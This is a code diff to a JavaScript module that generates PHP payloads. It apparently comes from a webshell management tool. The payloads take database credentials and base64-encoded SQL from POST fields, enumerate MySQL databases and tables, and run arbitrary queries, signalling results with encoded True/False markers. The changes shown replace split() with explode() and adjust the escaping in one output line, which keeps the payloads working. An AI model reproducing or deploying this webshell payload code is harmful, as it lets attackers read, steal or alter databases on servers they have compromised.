@@ -10,7 +10,7 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       $hst=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];
       $usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];
       $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
-      list($hst, $port) = split(":", $hst);
+      list($hst, $port) = explode(":", $hst);
       $port == "" ? $port = "3306" : $port;
       $T=@mysqli_connect($hst,$usr,$pwd,"",$port);
       $q=@mysqli_query($T,"SHOW DATABASES");
@@ -29,7 +29,7 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       $usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];
       $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
       $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
-      list($hst, $port) = split(":", $hst);
+      list($hst, $port) = explode(":", $hst);
       $port == "" ? $port = "3306" : $port;
       $T=@mysqli_connect($hst,$usr,$pwd,"",$port);
       $q=@mysqli_query($T, "SHOW TABLES FROM \`{$dbn}\`");
@@ -50,7 +50,7 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
       $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
       $tab=$m?stripslashes($_POST["${arg5}"]):$_POST["${arg5}"];
-      list($hst, $port) = split(":", $hst);
+      list($hst, $port) = explode(":", $hst);
       $port == "" ? $port = "3306" : $port;
       $T=@mysqli_connect($hst,$usr,$pwd,"",$port);
       @mysqli_select_db($T, $dbn);
@@ -73,14 +73,14 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
       $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
       $sql=base64_decode($_POST["${arg5}"]);
-      list($hst, $port) = split(":", $hst);
+      list($hst, $port) = explode(":", $hst);
       $port == "" ? $port = "3306" : $port;
       $T=@mysqli_connect($hst,$usr,$pwd,"",$port);
       @mysqli_query($T,"SET NAMES $_POST[${arg6}]");
       @mysqli_select_db($T,$dbn);
       $q=@mysqli_query($T,$sql);
       if(is_bool($q)){
-        echo("Status\t|\t\r\n".($q?"VHJ1ZQ==":"RmFsc2U=")."\t|\t\r\n");
+        echo("Status\\t|\\t\\r\\n".($q?"VHJ1ZQ==":"RmFsc2U=")."\\t|\\t\\r\\n");
       }else{
         $i=0;
         while($col=@mysqli_fetch_field($q)){echo($col->name."\t|\t");
